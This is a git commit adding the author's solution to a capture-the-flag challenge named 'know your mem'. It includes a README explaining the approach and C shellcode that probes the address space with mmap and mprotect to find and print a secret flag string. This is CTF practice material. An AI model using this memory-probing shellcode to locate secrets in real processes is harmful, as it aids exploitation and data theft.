99492f7e91474616452757aaba60f6db67a1f081
Bill Parks <c15william.parks@gmail.com>
2019-05-11 00:18:15 -0400

    Finished problem for know your mem

--- know_your_mem/README.md
+++ know_your_mem/README.md
@@ -14,3 +14,12 @@ Basically:
   make check
 
   # If all goes well, shellcode.bin.pkt will be ready to submit as-is!
+
+Solution:
+  We need a way of searching memory for the target string. We are unable to
+  install a segfault handler, and thus need another way of checking an address.
+  We used a two step approach. First, we mmap a large range (1<<14 pages), and
+  check if it's at the requested address. If it is, we try the next one. If not,
+  there is a page mapped in there already. We reduce the size of our mmap, and
+  try again. When we get to a small number of pages, we try mprotect on each
+  page. It's unclear right now why mmap does not work on single pages.
--- know_your_mem/simplified_shellcode.so.c
+++ know_your_mem/simplified_shellcode.so.c
@@ -1,18 +1,59 @@
 #include <stdio.h>
 #include <unistd.h>
+#include <sys/mman.h>
+#include <errno.h>
 
 #define ADDR_MIN   0x0000100000000000UL
 #define ADDR_MASK  0x00000ffffffff000UL
 
-
 void *shellcode()
 {
-    // 1. Find the secret in memory (starts with "OOO:")
-    // 2. Print it
-    // 3. ...
-    // 4. PROFIT!
+    int alloc_multiple = 1 << 14;
 
-    printf("Hi! Soon I'll be your shellcode!\n");
+    int size = 4096;
+    void * start = ADDR_MIN;
+    void * res;
 
-    return (void*) 0x123456; // For this simplified test it's also OK to return the address
+    while(1){
+      int alloc_len = alloc_multiple * size;
+      res = mmap(start, alloc_len, PROT_READ, 0x22  , -1, 0);
+      if(res == start || res != (void *)-1 ){
+        munmap(res, alloc_len);
+      }
+      //Handle cases with actual allocations
+      if(res != start){
+        //printf("trying to alloc %p %p\n", start, start + alloc_multiple * size);
+        if(res == (void*)-1){
+          //perror("");
+        }
+        if(alloc_multiple != 1){
+          //printf("Gotem %d\n", alloc_multiple);
+          //printf("count %d res %p start %p\n", count, res, start);
+          alloc_multiple >>=1;
+        }else if(alloc_multiple == 1){
+          void * found = start;
+          //printf("trying addr %p\n", found);
+          //printf("try %s\n", found + (size * 4));
+          int i;
+          for(i = -4; i < 8; i++){
+            void * this_guy = (void *)mprotect((void *)found + (size * i), size, 7);
+            //printf("this guy %d %p\n", i, this_guy);
+            if(this_guy == NULL){
+              char * found_string = (char *)(found + (size * i));
+              if(found_string[0] == 'O'){
+                write(1, found_string, 40);
+                return (void *)found_string;
+              }else{
+                //printf("Bad flag %p %s\n", found_string, found_string);
+                start = found_string + (size * 500);
+                alloc_multiple = (1 << 14);
+              }
+            }
+          }
+        }
+      }
+      else if(res == start){
+        start += alloc_multiple * size;
+      }
+    }
 }
